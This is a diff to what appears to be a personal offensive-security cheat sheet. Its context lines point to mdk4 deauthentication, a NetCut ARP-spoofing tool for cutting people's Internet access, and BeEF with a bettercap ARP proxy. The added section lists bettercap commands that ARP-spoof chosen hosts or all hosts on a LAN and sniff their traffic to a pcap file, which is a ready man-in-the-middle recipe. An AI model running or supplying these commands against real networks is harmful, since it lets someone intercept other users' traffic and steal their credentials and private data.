@@ -469,7 +469,16 @@ deauth using  mdk4
 -----------------------------------------------------[LIMIT-BANDWIDTH]----------------------------------------
 [netcut] -->A simple tool to ban people's Internet connection with ARP spoofing.
 * https://github.com/cdes5804/NetCut
-* 
+
+-----------------------------------------------------[REAL-TIME-LAN-ACTIVITY]----------------------------------------
+net.prob on
+set arp.spoof.internal --> all computers will bespooofed 
+set arp.spoof.targets ip_add, ip_add 
+arp.spoof on 
+set net.sniff.output ./pencap.pcap
+set net.sniff.verbose true
+net.sniff on 
+
 -----------------------------------------------------[BEEF-BETTERCAP-PROXY]----------------------------------------
 --> SETS UP A ARP PROXY ON A TARGET BETWEEN HOST AND GATEWAY.
   [Launch BEEF]
